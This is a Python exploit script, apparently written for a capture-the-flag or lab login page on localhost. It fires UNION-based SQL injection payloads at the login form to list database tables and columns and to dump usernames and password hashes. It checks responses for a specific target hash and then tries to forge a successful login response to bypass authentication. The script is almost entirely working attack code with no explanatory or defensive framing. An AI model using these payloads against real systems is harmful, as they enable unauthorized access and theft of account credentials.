import requests

url = "http://127.0.0.1:32892/index.php"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://127.0.0.1:32892",
    "Referer": "http://127.0.0.1:32892/"
}
cookies = {"PHPSESSID": "9b8ouneh58t3bjv346lp4s82ol"}

print("[*] Advanced SQLi: Trying to extract database structure and passwords")
print("="*60)

# Use UNION to extract information from information_schema
info_extraction_payloads = [
    # Extract table names
    ("' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- ", "test"),
    ("' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=database()-- ", "test"),
    
    # Extract column names
    ("' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- ", "test"),
    ("' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'-- ", "test"),
    
    # Extract all usernames
    ("' UNION SELECT username,2 FROM users-- ", "test"),
    ("' UNION SELECT 1,username FROM users-- ", "test"),
    ("' UNION SELECT GROUP_CONCAT(username),2 FROM users-- ", "test"),
    
    # Extract all passwords (hashes)
    ("' UNION SELECT password,2 FROM users-- ", "test"),
    ("' UNION SELECT 1,password FROM users-- ", "test"),
    ("' UNION SELECT GROUP_CONCAT(password),2 FROM users-- ", "test"),
    
    # Extract username and password together
    ("' UNION SELECT CONCAT(username,':',password),2 FROM users-- ", "test"),
    ("' UNION SELECT 1,CONCAT(username,':',password) FROM users-- ", "test"),
    ("' UNION SELECT GROUP_CONCAT(username,':',password),2 FROM users-- ", "test"),
]

print("\n[*] Attempting to extract database information...")

for username, password in info_extraction_payloads:
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        response_text = response.text.strip()
        
        # Check for responses that aren't the standard ones
        if response_text not in ['{"response":"username"}', '{"response":"password"}']:
            print(f"\n[+] Payload returned data:")
            print(f"    Payload: {username[:70]}...")
            print(f"    Response: {response_text}")
            
            # Check if we got password hash
            if "7d39307ae824e70052c0aa16816a9b16" in response_text:
                print("[!] TARGET HASH FOUND IN RESPONSE!")
            
            # Check for any hash-like strings (32 hex chars)
            import re
            hashes = re.findall(r'[a-f0-9]{32}', response_text)
            if hashes:
                print(f"[!] Found hash patterns: {hashes}")
                
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n[*] Trying to bypass by injecting into response or setting session")
print("="*60)

# Maybe we can use UNION to return a success response
bypass_response_payloads = [
    ("' UNION SELECT 'Success',2-- ", "test"),
    ("' UNION SELECT 1,'Success'-- ", "test"),
    ("' UNION SELECT '{\"response\":\"Success\"}',2-- ", "test"),
    ("' UNION SELECT 1,'{\"response\":\"Success\"}'-- ", "test"),
]

for username, password in bypass_response_payloads:
    data = {
        "username": username,
        "password": password,
        "submit": "submit"
    }
    
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
        print(f"\n[*] Payload: {username[:50]}...")
        print(f"    Response: {response.text}")
        
        if "Success" in response.text:
            print("[!] Success message in response!")
            if response.cookies:
                print(f"[!] New cookies: {response.cookies.get_dict()}")
                
    except Exception as e:
        print(f"[-] Error: {e}")

print("\n[*] Script complete")

